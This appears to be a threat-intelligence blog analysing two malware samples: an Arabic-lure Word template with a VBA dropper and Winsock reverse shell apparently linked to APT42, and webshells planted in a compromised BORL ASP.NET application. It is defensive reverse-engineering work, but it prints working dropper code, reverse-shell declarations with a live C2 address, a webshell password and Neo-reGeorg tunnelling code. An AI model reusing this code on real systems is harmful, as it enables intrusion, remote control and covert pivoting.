docs.title: Technical Focus
docs.text:
Threat Actor Tracking Occasional tracking of DPRK-nexus clusters - UNC5342, APT38, APT43, Lazarus Group — with emphasis on developer-targeting campaigns, cryptocurrency theft operations, and IT worker infiltration. Secondary focus on Iranian-nexus actors including MuddyWater/UNC5667, UNC1860, and APT42. A bit of eCrime on the side as well.

Malware Reverse Engineering Static and dynamic analysis of custom implants, loaders, and infostealers.

Supply Chain Analysis Tracking of malicious npm, PyPI, and open-source package operations — particularly DPRK-linked campaigns distributing staged payloads via legitimate package registries and CDN infrastructure.

Detection Engineering YARA rule development, SOC detection guidance, and infrastructure pivoting.

docs.title: Arabic Security-Training Lure Deploying a VBA Reverse Shell
Introduction
docs.text:
In May 2026, I stumbled upon a weaponised Microsoft Word macro-enabled template (.dotm, 33,966 bytes, SHA-256 e6cc542b690066cf6914e88199ce234236f2d929f313af8b0b2f8babe43d4f7d) that surfaced through one of the VirusTotal hunting rule. The template carries an Arabic-language lure themed as a peer-to-peer review request for a "third security training course", stored as an AutoText entry rather than in the visible document body.

Exhibit 1: Lure Document

Its VBA project, on Document_Open, decodes a letter-encoded ASCII-triplet payload from a UserForm TextBox and attempts to inject it as new VBA into the user's Normal.dotm global template through the Office object model. The stage-2 reverse shell connects to 51.38.87.253:25255 and bound an interactive cmd.exe to the socket on every Document_Close. The IP 51.38.87.253 has been associated with APT42 / Charming Kitten (Iranian-nexus, also tracked as TA453, Mint Sandstorm, Yellow Garuda) infrastructure

docs.title: Lure Document Analysis
docs.text:
The lure is a one-page Arabic-language course brochure for a six-day private-security training programme, framed as a draft schedule that the author wants reviewed before delivery. It opens with the Islamic Basmala, then lays out a table of topics, timings, learning outcomes, and target beneficiaries - running from 9 AM to noon daily - covering the duties and attributes of a security guard, security awareness, body language and threat recognition, search techniques, dealing with different segments of society, emergency response, watchtower and alarm operation, radio communications, conflict management, risk assessment, dress and standing posture, VIP protection, security report writing, and "the ethics of Islam in security work." The intended audience is named explicitly: security personnel generally, facility/company/shop guards, residential guards, and anyone interested in the subject. It closes with the signature of "Mr. Maytham Al-Uraimi" - a name with Omani/Emirati Gulf-region resonance - which, combined with the Arabic.dotm template and the otherwise mundane, professionally-framed content, makes it look like a piece of legitimate Gulf private-security training material that was either authored by or scraped from a real practitioner and then repurposed as a social-engineering wrapper.

The sample is a Microsoft Word 2007+ macro-enabled template (.dotm), not a macro-enabled document (.docm). The [Content_Types].xml part-type override for word/document.xml is the canonical .dotm content type and the file's MIME identifier matches. Templates are loaded by Word into the global template chain at session start and run their VBA on Document_Open for any document derived from them, which makes the template-format choice operationally meaningful: the malicious VBA runs in a slightly different trust path from a regular .docm lure.

Exhibit 2: Document Metadata

The template's metadata reports Creator: Win10 (the Word-internal application-creator identifier left at a generic value, not a typed operator persona) and Last Modified By: Kristina Rowell.

The metadata timestamps place the template's authoring window in February 2022, with a Create Date of 2022-02-06 12:21:00 UTC, a Modify Date of 2022-02-09 14:30:00 UTC, 13 recorded revisions, and a total edit time of one minute. The sample landed in the VirusTotal hunting queue in May 2026 and uploaded from Bangladesh, leaving a ~4-year gap between authoring and observed delivery. Either the operator is using a long-reused tooling artifact, or the metadata timestamps are spoofed, both are plausible.

A second, stronger temporal signal is the ZIP archive's per-entry modification dates. Every one of the 20 OOXML parts inside the .dotm is timestamped 1980-01-01 00:00:00, the DOS-time epoch zero. Microsoft Word does not produce this — when Word saves a .dotm, each part receives a real Zip Modify Date. A uniform epoch-zero stamp across every entry means the OOXML container was re-packed by an external tool after Word built it, typically a Python zipfile.ZipInfo(..., date_time=(1980,1,1,0,0,0)) builder or a similar weaponisation helper. This is evidence of a build pipeline, not of an operator clicking "Save" in Word.

Exhibit 3: ZIP Listing Showing all 20 Entries Pinned to 1980-01-01 00:00:00 - the File was Re-packaged Outside Word.

docs.title: VBA Project Analysis
docs.text:
The VBA project (word/vbaProject.bin, 34,816 bytes) is the legacy OLE2 wrapper Office still uses for VBA inside OOXML. Static triage with oleid reports a high-risk VBA project with suspicious indicators.

Exhibit 4: oleid Triage Output

The OLE2 project contains ten streams across two code modules: VBA/ThisDocument (the dropper) and VBA/UserForm1 (a near-empty code-behind for the UserForm that holds the encoded payload). The oledump.py -i listing splits each M-flagged code stream into compiled p-code and compressed source; ThisDocument carries 4611 + 1630 bytes (p-code + source) and UserForm1 carries 1045 + 274.

Exhibit 5: VBA Stream Layout

docs.title: Macro Execution Chain
docs.text:
Further analysis revealed that Document_Open is the only autoexec hook (vbaData.xml: <wne:eventDocOpen/>; project name TemplateProject). It sets view to wdPrintView, unprotects with the hard-coded password 20exlnt20, sets alreadyLaunched = True, and calls Launch. alreadyLaunched is never declared at module scope, so VBA gives each sub its own implicit procedure-local Variant; Launch's gating check fails against a fresh local and execution continues into SubstitutePage and Create_Word.

SubstitutePage replaces the (empty) body with the AutoText entry Doc from the attached Arabic.dotm template and saves.

Create_Word writes HKCU\SOFTWARE\Microsoft\Office\16.0\Word\Security\AccessVBOM = 1 to permit VBA self-modification, decodes the 16,392-character letter-encoded payload from UserForm1.TextBox1.Text via Putin (letter-to-digit substitution a → 0 … j → 9, then Chr(...) over each three-digit group; 5,464 bytes of VBA out), instantiates a hidden Word.Application (Visible = 0, DisplayAlerts = 0), creates a transient document via Documents.Add(""), and calls doc.VBProject.VBComponents(1).CodeModule.AddFromString (Putin(content)) to inject the decoded VBA into that transient document's ThisDocument module. It then closes the transient document with no SaveChanges (suppressed by DisplayAlerts = 0), quits the hidden app, and chains into unlink. The transient document never reaches disk; the stage-2 VBA does not survive Create_Word's return.

unlink is the apparent persistence move and does not work as intended. It reassigns ActiveDocument.AttachedTemplate from Arabic.dotm to C:\Users\<UserName>\AppData\Roaming\Microsoft\Templates\Normal.dotm (resolved via Application.UserName), saves the lure, and closes it. This is a pointer change on the lure's attached-template property; it does not copy VBA code between projects, and Normal.dotm is not modified. DeleteVBAPROJECT (the component-wipe) is reachable only via unlink's On Error GoTo Destroy guard; on a clean execution Exit Sub returns first and the wipe never runs. The lure on disk ends up with its AttachedTemplate pointer redirected to Normal.dotm and its own VBA project intact.

Net effect: AccessVBOM = 1, lure body replaced with the Arabic decoy, attached-template pointer moved to Normal.dotm, lure re-saved and closed. The stage-2 reverse shell is constructed but not persisted and not executed. The chain does not, as written, achieve the apparent operator intent; runtime confirmation would settle whether a Word internal quirk inherits the transient document's VBProject into Normal.dotm despite the discard.

Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "0{00020906-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Sub Document_Open()
    If ActiveDocument.ActiveWindow.View.Type <> wdPrintView Then
        ActiveDocument.ActiveWindow.View.Type = wdPrintView
    End If
    If ActiveDocument.ProtectionType <> wdNoProtection Then ActiveDocument.Unprotect _
       Password:="20exlnt20"
    alreadyLaunched = True
    Launch
End Sub
Private Sub Launch()
    If alreadyLaunched = True Then
        Exit Sub
    End If
    SubstitutePage
    Create_Word
    alreadyLaunched = True
End Sub
Sub Create_Word()
    CreateObject("Wscript.Shell").RegWrite "HKCU\SOFTWARE\Microsoft\Office\16.0\Word\Security\AccessVBOM", 1, "REG_DWORD"
    Dim content As String
    content = UserForm1.TextBox1.Text
    DoEvents
    Set Wordy = Interaction.CreateObject("Word.Application")
    Wordy.DisplayAlerts = 0
    Wordy.Visible = 0
    Set doc = Wordy.Documents.Add("")
    doc.Saved = True
    doc.VBProject.VBComponents(1).CodeModule.AddFromString (Putin(content))
    doc.Close
    Wordy.Quit
    unlink
End Sub
Private Function Putin(i As String) As String
    Dim o As String
    i = Replace(i, "a", "0")
    i = Replace(i, "b", "1")
    i = Replace(i, "c", "2")
    i = Replace(i, "d", "3")
    i = Replace(i, "e", "4")
    i = Replace(i, "f", "5")
    i = Replace(i, "g", "6")
    i = Replace(i, "h", "7")
    i = Replace(i, "i", "8")
    i = Replace(i, "j", "9")
    For Counter = 1 To Len(i) Step 3
        o = o & Chr(Mid(i, Counter, 3))
    Next
    Putin = o
End Function
Private Sub SubstitutePage()
    Dim doc As Word.Document
    Dim firstPageRange As Range
    Dim rng As Range
    Dim autoTextTemplateName As String
    ActiveDocument.ActiveWindow.View.DisplayBackgrounds = True
    ActiveDocument.Background.Fill.ForeColor.RGB = RGB(255, 255, 255)
    ActiveDocument.Background.Fill.Solid
    autoTextTemplateName = "Doc"
    Set firstPageRange = Word.ActiveDocument.Range
    firstPageRange.Select
    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    Set doc = ActiveDocument
    Set rng = doc.Sections(1).Range
    doc.AttachedTemplate.AutoTextEntries(autoTextTemplateName).Insert rng, True
    doc.Save
End Sub
Sub unlink()
    Application.DisplayAlerts = False
    On Error GoTo Destroy
    ThisDocument.AttachedTemplate.Saved = True
    CurrUser = Application.UserName
    tmpLoc = "C:\Users" & CurrUser & "\AppData\Roaming\Microsoft\Templates\Normal.dotm"
    ActiveDocument.AttachedTemplate = tmpLoc
    ActiveDocument.AttachedTemplate.Saved = True
    ActiveDocument.Save
    ThisDocument.Close savechanges:=False
Exit Sub
Destroy:
    Call ThisDocument.DeleteVBAPROJECT
    ActiveDocument.Save
    ActiveDocument.AttachedTemplate.Saved = True
    ThisDocument.Close savechanges:=False
End Sub
Sub DeleteVBAPROJECT()
    Application.DisplayAlerts = False
    Dim i As Long
    On Error Resume Next
    With ThisDocument.VBProject
        For i = .VBComponents.Count To 1 Step -1
            .VBComponents.Remove .VBComponents(i)
            .VBComponents(i).CodeModule.DeleteLines _
            1, .VBComponents(i).CodeModule.CountOfLines
        Next i
    End With
    On Error GoTo 0
    ActiveDocument.Save
End Sub

Exhibit 6: Decompressed source of the ThisDocument module

docs.title: UserForm Payload Extraction and Decoding
docs.text:
The stage-2 substrate lives in the UserForm1/o OLE stream of word/vbaProject.bin, 16,448 bytes long. This stream is not opaque binary - it is two concatenated MS-OFORMS TextProps records, each carrying one of the UserForm's variable-length property values. Walking the stream as (2-byte Version | 2-byte cbTextProps | Body) produces a clean partition: a 16,420-byte record at offset 0x0000 carrying the TextBox's Text property (the encoded payload), followed immediately by a 28-byte record at offset 0x4024 carrying the TextBox's FontName property (the string Tahoma). Total consumed: 16,420 + 28 = 16,448 bytes, the entire stream. The payload itself (a single contiguous block of [a-j] characters, 16,392 bytes long) sits inside the larger record's ExtraDataBlock, beginning at stream offset 0x001C and ending at 0x4024 immediately before the second record's header.

Exhibit 7: xxd -l 64 /tmp/UserForm1_o.bin and xxd -s -64 /tmp/UserForm1_o.bin side-by-side, showing the OFORMS header 00 02 20 40 … at offset 0x00 resolving into the [a-j] payload at 0x1C, and the trailing TextProps record 00 02 18 00 … at 0x4024 containing the Tahoma font value.

Decoding the payload statically reproduces what Putin would output at runtime. The longest [a-j] run is exactly 16,392 characters, divisible by 3, yielding 5,464 triplets with no out-of-range values. The first three triplets decode to 067 111 110 (C, o, n) and the last three to 083 117 098 (S, u, b); the recovered file therefore begins with Const ip = "51.38.87.253" and ends with End Sub, exactly the start and end of a complete VBA module. The decoded module is 5,464 bytes; its SHA-256 is 317f6f93fe81d1800cbbb1d8f8dbb7c7b27412358f3058f58a2496bae20f0863.

Exhibit 8: Python decode harness output showing encoded len: 16392, decoded len: 5464, the SHA-256, first line Const ip = "51.38.87.253", and last line End Sub.

docs.title: Stage-2 Reverse-Shell Analysis
docs.text:
The decoded VBA module is 145 lines of Winsock reverse-shell code. It declares four Win32 structures (WSADATA, ADDRINFO, STARTUPINFOA, PROCESS_INFORMATION), two enums for address families and socket types, and ten Private Declare PtrSafe API imports from ws2_32.dll (WSAStartup, WSACleanup, WSAGetLastError, WSASocketA, connect, closesocket, GetAddrInfo) and kernel32.dll (CopyMemory, ZeroMemory, and CreateProc aliased to CreateProcessA). The C2 endpoint is hard-coded as VBA string constants at the top of the module: ip = "51.38.87.253" and port = "25255".

Const ip = "51.38.87.253"
Const port = "25255"
Const INVALID_SOCKET = -1
Const WSADESCRIPTION_LEN = 256
Const SOCKET_ERROR = -1
Private Type WSADATA
    wVersion As Integer
    wHighVersion As Integer
    szDescription(0 To WSADESCRIPTION_LEN) As Byte
    szSystemStatus(0 To WSADESCRIPTION_LEN) As Byte
    iMaxSockets As Integer

End Type
Private Type ADDRINFO

    ai_family As Long
    ai_socktype As Long
    ai_protocol As Long
    ai_addrlen As Long
    ai_canonName As LongPtr
    ai_addr As LongPtr
    ai_next As LongPtr
End Type
Private Type STARTUPINFOA

    lpReserved As String

End Type
Private Type PROCESS_INFORMATION

End Type
Enum af
    AF_UNSPEC = 0
    AF_INET = 2
    AF_IPX = 6
    AF_APPLETALK = 16
    AF_NETBIOS = 17
    AF_INET6 = 23
    AF_IRDA = 26

End Enum
Enum sock_type
    SOCK_STREAM = 1
    SOCK_DGRAM = 2
    SOCK_RAW = 3
    SOCK_RDM = 4
    SOCK_SEQPACKET = 5
End Enum
Private Declare PtrSafe Function WSAStartup Lib "ws2_32.dll" (ByVal wVersionRequested As Integer, ByRef data As WSADATA) As Long
Private Declare PtrSafe Function connect Lib "ws2_32.dll" (ByVal socket As LongPtr, ByVal SOCKADDR As LongPtr, ByVal namelen As Long) As Long
Private Declare PtrSafe Sub WSACleanup Lib "ws2_32.dll" ()
Private Declare PtrSafe Function GetAddrInfo Lib "ws2_32.dll" Alias "getaddrinfo" (ByVal NodeName As String, ByVal ServName As String, ByVal lpHints As LongPtr, lpResult As LongPtr) As Long
Private Declare PtrSafe Function closesocket Lib "ws2_32.dll" (ByVal socket As LongPtr) As Long
Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)
Private Declare PtrSafe Function WSAGetLastError Lib "ws2_32.dll" () As Long
Private Declare PtrSafe Function CreateProc Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Any, ByVal lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFOA, lpProcessInformation As PROCESS_INFORMATION) As LongPtr
Private Declare PtrSafe Sub ZeroMemory Lib "kernel32" Alias "RtlZeroMemory" (Destination As STARTUPINFOA, ByVal Length As Long)
Private Declare PtrSafe Function WSASocketA Lib "ws2_32.dll" (ByVal af As Long, ByVal t As Long, ByVal protocol As Long, lpProtocolInfo As Any, ByVal g As Long, ByVal dwFlags As Long) As Long
Exhibit 9: Stage-2 Winsock Reverse-shell Code

The revShell() function is the canonical Winsock-spawn-cmd reverse-shell pattern. It calls WSAStartup(MAKEWORD(2,2), ...) to initialise Winsock 2.2, resolves the C2 via GetAddrInfo with ai_family = AF_UNSPEC and ai_socktype = SOCK_STREAM, and walks the returned addrinfo linked list calling WSASocketA and connect for each node until one succeeds. Once connected, it zero-initialises a STARTUPINFOA, sets dwFlags = &H100 (STARTF_USESTDHANDLES), assigns the connected socket handle to hStdInput, hStdOutput, and hStdError, and calls CreateProc(vbNullString, "cmd", ByVal 0&, ByVal 0&, True, &H8000000, 0, vbNullString, si, pi). The combination of bInheritHandles = TRUE and CREATE_NO_WINDOW (0x08000000) binds cmd.exe's standard handles to the connected socket while suppressing the console window. This is a textbook Windows reverse-shell construction.

docs.title: Persistence
docs.text:
The dropper's intended mechanism is template-poisoning of %APPDATA%\Microsoft\Templates\Normal.dotm such that an injected Document_Close() would fire on every Word-document close. The chain does not achieve this. Create_Word injects the stage-2 VBA into the VBProject of a transient document, then immediately discards it:

Set doc = Wordy.Documents.Add("")             ' new transient document - its own VBProject
doc.VBProject.VBComponents(1).CodeModule.AddFromString (Putin(content))   ' code added to transient doc
doc.Close                                      ' transient doc discarded (DisplayAlerts=0 suppresses save prompt)

docs.title: Infrastructure and Attribution
docs.text:
The sample itself was submitted to VirusTotal a single time, from Bangladesh, on 10-05-2026.

The IP 51.38.87.253 has been associated with APT42 / Charming Kitten (Iranian-nexus, also tracked as TA453, Mint Sandstorm, Yellow Garuda) infrastructure, but I have not independently verified this association from the sample alone (https://cloud.google.com/blog/topics/threat-intelligence/untangling-iran-apt42-operations).

The Arabic security-training-course lure theme is compatible with APT42 / Charming Kitten targeting (Iranian-nexus actors have a documented history of operations against Arabic-speaking security and military entities across the Gulf, Iraq, Lebanon, and Syria), but theme alone does not constitute attribution.

NOTE: Weather this was an old sample uploaded just now by some researcher, or new potential APT42 campaign lure is beyond my current knowledge. In any case, it's was an interesting sample to analyse.

docs.title: APPS.zip: A Compromised BORL Web Application and Two Webshells
Executive Summary
docs.text:
On 7 July 2026 a 60 MB ZIP archive was submitted to VirusTotal from a single unique source from India. The archive with a filename APPS.zip, contains what appears to be the on-disk web root of an ASP.NET application belonging to Bharat Oman Refineries Limited (BORL). BORL operates the Bina refinery in Madhya Pradesh and is a wholly-owned subsidiary of Bharat Petroleum Corporation Limited (BPCL), the Government-of-India-owned oil major into which it was amalgamated in 2022; ownership ultimately sits under the Ministry of Petroleum and Natural Gas. The application itself dates from roughly 2017-2024 and looks legitimate. However, three ASP.NET files added between 30 June and 3 July 2026, days before the archive was uploaded, are webshells - which opens up a lot of questions.

As of the time of writing, I have found no public reporting of this intrusion, and neither BORL nor BPCL has publicly disclosed or confirmed a breach consistent with this activity. Everything below is derived solely from the archive submitted to VirusTotal.

After the analysis, the two distinct webshell families are:

  1. A full-featured manual-operator ASPX shell (borlapi.aspx) offering file browser, file editor, file uploader, cmd execution, and an SQL query manager, protected by the hard-coded password Admin1234@_.
  2. A socket-relay / tunnelling webshell (borel.aspx) whose protocol vocabulary (CONNECT, FORWARD, READ, DISCONNECT), 40-slot object[] info array, and per-request base64-plus-substitution encoding are structurally identical to the ASPX template shipped by Neo-reGeorg, a fork of SensePost's reGeorg maintained by a Chinese researcher (GitHub L-codes) and repeatedly attributed by commercial intelligence to China-nexus intrusion sets.

docs.title: Background
docs.text:
The two tunnelling shells in this archive belong to a well-known lineage. SensePost released reGeorg, the successor to their earlier reDuh tool, which turns a webshell on a bastion host into a SOCKS proxy so an operator can pivot into a network from a single foothold.1 A researcher publishing under the GitHub handle L-codes later released Neo-reGeorg, an aggressive refactor of reGeorg designed to be harder to fingerprint: it disguises its traffic as ordinary base64, wraps its data in a byte-length-value format, and can hide its idle response inside a decoy page such as a fake 404.2 Neo-reGeorg is open-source and used by red teams worldwide, but it has also become a common post-exploitation tunnel in intrusions attributed to several China-nexus intrusion sets, which is what makes its appearance here relevant to the attribution question later in this post.

The manual borlapi.aspx shell comes from a different and older tradition: the WSO / c99 family of administrative webshells that bundle a file browser, editor, uploader, command runner and database client behind a single password prompt. That lineage is commodity tooling, mirrored across dozens of public repositories, and carries little attribution weight on its own.

docs.title: Provenance and File Metadata
docs.text:
Field Value Filename APPS.zip SHA-256 52e613240ebaa85272e7fef5134f101a909ee7709e24dcb53f763462a436e49c SHA-1 4708baba3d7a101c83ccb39e5688e5c5d1bce315 MD5 65628cd154e468a1848c0815e2c1b7c1 Size 62,617,816 bytes (59.72 MiB) VT first seen 7 July 2026, 03:39 UTC VT submissions 1 (single unique source) File uploaded from (VT enterprise UI) India

The single-source, single-submission fingerprint and the archive password suggest either defensive triage or staged handoff between researchers. It does not look like automated malspam or wild collection.

docs.title: Archive Layout
docs.text:
Extracted, the ZIP expands to two sibling ASP.NET applications:

APPS/
├── BORLAPI/    - ASP.NET Web API (.NET 4.6.1, EF6, AttributeRouting)
└── BORLCMMS/   - AngularJS front-end for a compliance/CMMS dashboard

Total: 1,799 files, 218 MB on disk. The application stack contains Antlr, Newtonsoft.Json, Linq-to-Excel, EF6, Angular 1.x, jQuery, moment.js. The .exe files inside (csc.exe, csi.exe, vbc.exe, VBCSCompiler.exe) are the standard Roslyn compilers shipped with ASP.NET and are not malicious.

Figure 1: Main folder sort.

docs.title: Identifying the Recently-Added Files
docs.text:
The overwhelming majority of files in the archive carry mtimes between 2017 and 2024, which is plausible for a long-lived enterprise application. Filtering out static assets (.cshtml, .js, .css, fonts, images, maps) and looking only at code/config files modified in 2025 or later yields exactly three files, all under BORLAPI/:

Figure 2: The newer files added to the APPS folder.

The three-day cadence of the drops (30 June -> 2 July -> 3 July) is suggestive of an operator iterating: dropping a manual shell first, then adding tunnelling capability, then dropping a second copy of the tunnelling shell into a less-attention-getting subdirectory (Content/, which normally holds CSS and images).

docs.title: borlapi.aspx - Manual-Operator WSO-Style Shell
docs.text:
borlapi.aspx is a straightforward, unobfuscated ASP.NET Web-Forms page. Its Page_Load handler dispatches on a base64-encoded act query-string parameter to one of six operator features:

Figure 3: Partial contents of borlapi.aspx.

The command tokens are only cosmetically hidden (base64 with the literal ASCII strings visible after one decode). The shell's cookie name for its working-directory state is shell_path. Password check is a plaintext comparison against the hard-coded Admin1234@_.

Feature-wise this is a WSO (Web Shell by oRb) / c99-lineage administrative shell ported to ASP.NET - file browser + editor + uploader + shell command + SQL client + logout.3 The "dark" style constant and the modal layout in the HTML confirm the WSO visual heritage. Nothing in the code identifies a specific author or operator. In other words, the password is generic, no unique tag or version string, and no C2 callback. It is best treated as commodity tradecraft, the sort of thing an operator can grab from any of dozens of GitHub mirrors.

Figure 4: The Page_Load dispatcher of borlapi.aspx.

Kaspersky's Backdoor.ASP.Agent.co verdict on the parent ZIP is consistent with this file being the primary trigger, but the more interesting artefact, from an attribution perspective, is borel.aspx.

docs.title: borlapi.aspx Targets SQL Server Specifically
docs.text:
Beyond the action tokens covered above, extracting the full set of base64 tokens embedded in the shell reveals hardcoded discovery queries:

  • SELECT * FROM INFORMATION_SCHEMA.TABLES;
  • SELECT name FROM master.dbo.sysdatabases

master.dbo.sysdatabases is a Microsoft SQL Server catalogue view. It does not exist on MySQL, PostgreSQL, or Oracle. As far as I could understand, it is present on SQL Server 2000 and later. The shell also emits IIS-specific server-variable lookups (LOCAL_ADDR, SERVER_SOFTWARE) rather than generic HTTP headers.

Combined with the fact that the compromised application runs on Microsoft SQL Server, this is consistent with an operator who either knew the target stack in advance or was using a shell whose defaults happened to fit. It is a weak signal on its own, but it mildly favours a not-fully-blind attacker over a scanner dropping whatever landed first.

The shell also supports finer-grained file operations than the top-level tokens suggest. Extracted sub-tokens include fedit_read, fedit_write, fedit_mkdir, fedit_remove, and fedit_rename, plus cookie state keys shell_pass and shell_sql, and the MIME type application/force-download for file exfiltration. In other words, borlapi.aspx is a full file-and-database administration console, not just a command runner.

docs.title: borel.aspx - A Tunnelling Shell Structurally Consistent with Neo-reGeorg
docs.text:
borel.aspx at BORLAPI/borel.aspx is 19,937 bytes and aggressively obfuscated. The obfuscation is a stack of three techniques.

  1. C-style Unicode escape sequences in identifiers. Every identifier is written as a mix of ASCII characters and \uXXXX / \UXXXXXXXX escapes. In C# source these render as literal ASCII text of six or ten characters each. The C# compiler resolves them at compile time and treats the resulting identifiers as equivalent to their ASCII form. So StrTr, \u0053trTr, and Str\u202aTr all compile to the same symbol. A human reader sees noise. The compiler sees one identifier.
  2. Random noise comments. Every second line carries a 30-character base62 comment like /*aMbi0gltl4OXlm6UJ0x5zHRIkjImRF*/. These comments have no semantic content. They exist only to defeat naive string signatures.
  3. Dot-separator obfuscation on select string literals. The error strings returned by the CONNECT verb are written with periods between every character. Instead of "Port close" and "Port filtered", the file contains "P.o.r.t c.l.o.s.e" and "P.o.r.t f.i.l.t.e.r.e.d". This defeats simple grep "Port close" style detections. The strings still convey the same information to the operator, who reads them by eye rather than by regex.

Normalising the file, resolving the escape sequences and stripping the noise comments, reveals a source that matches the ASP.NET template shipped by Neo-reGeorg (github.com/L-codes/Neo-reGeorg), a widely-used fork of SensePost's original reGeorg. Neo-reGeorg is maintained in a bilingual (Chinese/English) repository by an author who publishes primarily in Simplified Chinese and whose tooling has been observed in intrusions attributed to multiple China-nexus intrusion sets.

// Substitution codec. Wire encoding is base64(payload) then StrTr(en -> de).
// The reader inverts with StrTr(de -> en) then base64-decode.
public String StrTr(string input, string frm, string to) {
    String r = "";
    for (int i = 0; i < input.Length; i++) {
        int index = frm.IndexOf(input[i]);
        r += (index != -1) ? to[index] : input[i];
    }
    return r;
}

// Unpack a 40-slot object[] from a byte stream. Wire layout is a stream
// of triples: (byte tag)(int32 BE length + K)(payload of length bytes),
// where K = 68903463 is a fixed additive obfuscator both sides know.
// Slots 2..9 are strings (see command constants below). Anything else
// stays as a byte[].
public static Object[] blv_decode(byte[] data) {
    Object[] info = new Object[40];
    int i = 0, data_len = data.Length, b;
    byte[] length = new byte[4];
    MemoryStream dataInput = new MemoryStream(data);
    while (i < data_len) {
        b = dataInput.ReadByte();                       // tag
        dataInput.Read(length, 0, length.Length);       // length prefix
        int l = bytesToInt(length) - 68903463;          // subtract additive K
        byte[] v = new byte[l];
        dataInput.Read(v, 0, v.Length);
        i += (5 + l);
        info[b] = (b > 1 && b <= 9) ? (object) Encoding.Default.GetString(v)
                                    : (object) v;
    }
    return info;
}

// Pack a 40-slot object[] back into the byte-triple stream.
// Slots 0 and 39 are stuffed with fresh random padding on every response
// (5..20 bytes each) to break naive size fingerprinting.
public static byte[] blv_encode(Object[] info) {
    Random r = new Random();
    info[0]  = randBytes(r, 5, 20);
    info[39] = randBytes(r, 5, 20);
    MemoryStream buf = new MemoryStream();
    for (int b = 0; b < info.Length; b++) {
        if (info[b] == null) continue;
        byte[] v = (info[b] is String) ? Encoding.Default.GetBytes((String) info[b])
                                       : (byte[]) info[b];
        buf.WriteByte((byte) b);
        byte[] l = intToBytes(v.Length + 68903463);     // add additive K
        buf.Write(l, 0, l.Length);
        buf.Write(v, 0, v.Length);
    }
    return buf.ToArray();
}

// randBytes / intToBytes / bytesToInt: uninteresting helpers.
// bytesToInt is big-endian. intToBytes is its inverse.

// Wire-protocol slot constants for the info[] array:
int DATA          = 1;   // payload bytes for FORWARD / READ
int CMD           = 2;   // "CONNECT" | "DISCONNECT" | "FORWARD" | "READ"
int MARK          = 3;   // operator-supplied session key (dictionary index)
int STATUS        = 4;   // "OK" | "FAIL"
int ERROR         = 5;   // error text on FAIL
int IP            = 6;   // target host for CONNECT (name or IP)
int PORT          = 7;   // target port for CONNECT
int REDIRECTURL   = 8;   // optional. re-issue whole request to another URL
int FORCEREDIRECT = 9;

// Idle-response banner. See the Idle-Page Banner subsection below.
String GeorgHello =
    "lyhRqWcEQZ3WvWREPi2aWQpnM0YYxnX8GjceQFXl3gKDAijmvFpqDbXEsLpfALkaMh2fsZmcM1YM70hgWiVaTy1Rl/==";

// The two runtime substitution alphabets. 'en' is the standard base64
// alphabet. 'de' is a permutation of it. StrTr swaps between them.
String en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
String de = "kcyZh0ntTpDqM3ElAPWFzjQLvmx7IsG4/X+w6VC89Yor2RuSfegb1Uia5dBNOKHJ";

// Entry point:  Read POST body, substitution-decode, unpack info[],
//               dispatch on info[CMD], pack response, substitution-encode, Write.
info[CMD] Preconditions What the shell does Response CONNECT info[IP], info[PORT] set Open a TCP Socket to IP:PORT. Store it in Application[MARK]. Set the socket non-blocking with a 2-second connect timeout. STATUS="OK", or STATUS="FAIL" with ERROR set to "Port close" or "Port filtered" FORWARD Application[MARK] exists s.Send(info[DATA]). Write operator bytes to the tunnelled socket. STATUS="OK" or STATUS="FAIL" READ Application[MARK] exists Loop s.Receive() into a MemoryStream up to 512 KiB or until short read. Return via info[DATA]. STATUS="OK", info[DATA] = <bytes> DISCONNECT Application[MARK] exists s.Close(). Application.Remove(MARK). (silent, no encoded response body)

docs.title: The Idle-Page Banner: A Neo-reGeorg Fingerprint
docs.text:
The most attribution-relevant string in the file is the GeorgHello constant. It is what an unauthenticated outside probe sees when it GETs /borel.aspx with no body. The shell writes StrTr(GeorgHello, de -> en) and base64-decodes it before returning the result to the caller. Running that inverse reveals the plaintext.

Obfuscated banner constant:
    lyhRqWcEQZ3WvWREPi2aWQpnM0YYxnX8GjceQFXl3gKDAijmvFpqDbXEsLpfALkaMh2fsZmcM1YM70hgWiVaTy1Rl/==

After StrTr(de -> en):
    PCEtLSBOWDNSYStOR2s3SWJGMFppaGhneVBxWThPNy9KQ2VZYTJLKzhOdXJwQXA3MEswdDZBM0pMbFEyS2l3IC0tPg==

After base64-decode:
    <!-- NX3Ra+NGk7IbF0ZihhgyPqY8O7/JCeYa2K+8NurpAp70K0t6A3JLlQ2Kiw -->

The HTML-comment-wrapped random token is the canonical Neo-reGeorg idle-page response. The original SensePost reGeorg used a plaintext greeting of the form Georg says, 'All seems fine'. The L-codes fork changed it to an HTML-comment token so the response can be embedded inside a decoy HTML wrapper page without breaking rendering. The token between <!-- and --> is what the Neo-reGeorg client extracts and uses as the per-deployment session key that seeds StrTr.

docs.title: Content/borel.aspx - The Same Shell, but Renamed
docs.text:
The second copy of the tunnelling shell, dropped one day later into BORLAPI/Content/, is only 8,390 bytes and carries none of the Unicode obfuscation. Every identifier has been mechanically renamed to placeholders of the form X<n>, spanning at least X1 through X71. The renaming is not a simple sequence. X8 is blv_decode, X19 is blv_encode, X22 is randBytes, X17 is bytesToInt, X1 is StrTr, and the command verb variable is X71. The gaps suggest a name-scrambling pass rather than a linear rename.

